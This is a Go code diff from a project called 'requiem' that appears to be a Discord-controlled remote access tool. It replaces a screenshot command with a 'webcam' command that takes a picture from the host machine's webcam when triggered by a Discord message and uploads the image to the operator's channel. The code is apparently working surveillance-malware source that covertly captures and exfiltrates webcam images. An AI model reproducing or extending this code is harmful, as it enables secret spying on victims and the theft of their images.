@@ -2,14 +2,19 @@ package commands
 
 import (
 	"fmt"
+	"strings"
 
 	"requiem/funcs"
+	"requiem/utils"
 
 	"github.com/bwmarrin/discordgo"
 )
 
-func (*ScreenshotCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
-	pic, err := funcs.TakeScreenshot()
+func (*CamCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
+	content := strings.Join(args, " ")
+	hydrate := utils.HasFlag(content, "hydrate")
+
+	pic, err := funcs.TakeWebcam(hydrate)
 	if err != nil {
 		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to capture - %s", err), msg.Reference())
 		return
@@ -19,18 +24,18 @@ func (*ScreenshotCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCre
 		Content:   "🟩 Successfully captured.",
 		Reference: msg.Reference(),
 		Files: []*discordgo.File{{
-			Name:   "ss.jpg",
+			Name:   "cam.jpg",
 			Reader: pic,
 		}},
 	})
 }
 
-func (*ScreenshotCommand) Name() string {
-	return "ss"
+func (*CamCommand) Name() string {
+	return "webcam"
 }
 
-func (*ScreenshotCommand) Info() string {
-	return "Takes a screenshot."
+func (*CamCommand) Info() string {
+	return "Takes a picture from the webcam."
 }
 
-type ScreenshotCommand struct{}
+type CamCommand struct{}
